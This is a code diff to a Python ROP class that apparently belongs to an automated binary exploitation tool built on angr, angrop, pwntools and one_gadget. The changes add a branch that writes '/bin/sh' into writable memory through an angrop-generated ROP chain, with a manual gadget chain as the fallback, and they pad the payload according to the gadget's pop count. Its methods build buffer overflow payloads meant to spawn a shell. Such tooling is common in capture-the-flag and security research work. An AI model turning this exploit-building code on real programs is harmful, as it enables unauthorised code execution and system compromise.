@@ -7,6 +7,11 @@ import os
 from Print import Print
 import time
 
+logging.getLogger('angr').setLevel(logging.WARNING)
+logging.getLogger('angrop').setLevel(logging.WARNING)
+logging.getLogger('os').setLevel(logging.WARNING)
+logging.getLogger('pwnlib').setLevel(logging.WARNING)
+
 class ROP:
     def __init__(self, analysis, v_lvl, p): 
         self.fart_print = Print(v_lvl)
@@ -24,23 +29,18 @@ class ROP:
         self.cache_angrop = b''
 
     def write_binsh_to_mem(self):
-        self.analysis.hbsh = True
-        return self.write_binsh_manual()
-
-
-
-
-
-
-        #if self.cache_angrop == b'':
-        #    angr_proj = angr.Project(self.analysis.binary)
-        #    angr_rop  = angr_proj.analyses.ROP()
-        #    angr_rop.find_gadgets_single_threaded() 
-        #    #angr_rop.find_gadgets()
-        #    self.analysis.hbsh = True
-        #    self.cache_angrop = angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
-        #return self.cache_angrop
-    
+        if(0!=self.num_pops(self.get_primitives_str())):
+            self.analysis.hbsh = True
+            return self.write_binsh_manual()
+        elif self.cache_angrop == b'':
+            angr_proj = angr.Project(self.analysis.binary)
+            angr_rop  = angr_proj.analyses.ROP()
+            angr_rop.find_gadgets_single_threaded() 
+            #angr_rop.find_gadgets()
+            self.analysis.hbsh = True
+            self.cache_angrop = angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
+            return self.cache_angrop
+        
     def build_exploit(self, failed=False):
         self.fart_print.info("Attempting to discover the constraints to exploiting the buffer overflow")
         payload = None
@@ -280,22 +280,13 @@ class ROP:
     def write_binsh_manual(self):
         print("buffer length is "+str(len(self.set_offset())))
         ret = b''
-
-
-        
         ret += self.fill_reg(self.get_primitive_regs()[1].strip(' '), '/bin/sh\0')
-        print("putting /bin/sh in " + self.get_primitive_regs()[1].strip(' '))
-
         ret += self.fill_reg(self.get_primitive_regs()[0], self.get_writeable_mem())
-        print("putting writable mem in " + self.get_primitive_regs()[0].strip(' '))
-
-
         ret += self.get_primitives()
-        print(self.get_primitives())
-
-        ret += p64(0)*2 # temp need geniric add zero
+        ret += p64(0)*self.num_pops(self.get_primitives_str())
         return ret
-            
+    
+
     def one_gadget(self):
           return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', self.libc]).decode().split(' ')]
 
